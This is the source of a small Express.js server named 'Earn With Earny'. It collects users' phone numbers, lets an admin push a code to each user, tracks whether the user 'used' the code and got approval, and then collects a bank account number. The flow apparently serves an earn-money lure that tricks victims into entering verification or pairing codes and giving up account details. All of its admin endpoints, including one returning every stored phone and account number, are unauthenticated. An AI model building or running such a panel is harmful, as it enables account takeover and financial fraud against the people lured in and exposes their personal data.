const express = require("express");
const path = require("path");
const app = express();

app.use(express.json());

// TEMPORARY MEMORY STORAGE
let requests = []; // { phone, code, codeUsed, approved, accountNumber }

// Serve front page and admin page
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.get("/admin", (req, res) => res.sendFile(path.join(__dirname, "admin.html")));

// USER submits phone number
app.post("/api/submit", (req, res) => {
    const { phone } = req.body;
    if (!requests.find(r => r.phone === phone)) {
        requests.push({ phone, code: null, codeUsed: false, approved: false, accountNumber: null });
    }
    res.json({ message: "Number submitted" });
});

// ADMIN sets code
app.post("/api/setcode", (req, res) => {
    const { phone, code } = req.body;
    let entry = requests.find(r => r.phone === phone);
    if (entry) entry.code = code;
    res.json({ success: true });
});

// USER checks code
app.get("/api/check", (req, res) => {
    const phone = req.query.phone;
    let entry = requests.find(r => r.phone === phone);
    res.json({ code: entry ? entry.code : null });
});

// USER marks code as used
app.post("/api/codeused", (req, res) => {
    const { phone } = req.body;
    let entry = requests.find(r => r.phone === phone);
    if (entry) entry.codeUsed = true;
    res.json({ success: true });
});

// ADMIN approves code usage
app.post("/api/approve", (req, res) => {
    const { phone } = req.body;
    let entry = requests.find(r => r.phone === phone);
    if (entry) entry.approved = true;
    res.json({ success: true });
});

// USER checks approval & code usage
app.get("/api/status", (req, res) => {
    const phone = req.query.phone;
    let entry = requests.find(r => r.phone === phone);
    res.json({ 
        codeUsed: entry ? entry.codeUsed : false, 
        approved: entry ? entry.approved : false 
    });
});

// USER submits account number
app.post("/api/account", (req, res) => {
    const { phone, accountNumber } = req.body;
    let entry = requests.find(r => r.phone === phone);
    if (entry) entry.accountNumber = accountNumber;
    res.json({ success: true });
});

// ADMIN fetches all submissions
app.get("/api/requests", (req, res) => {
    res.json(requests);
});

// Start server
app.listen(3000, () => console.log("Earn With Earny running on port 3000"));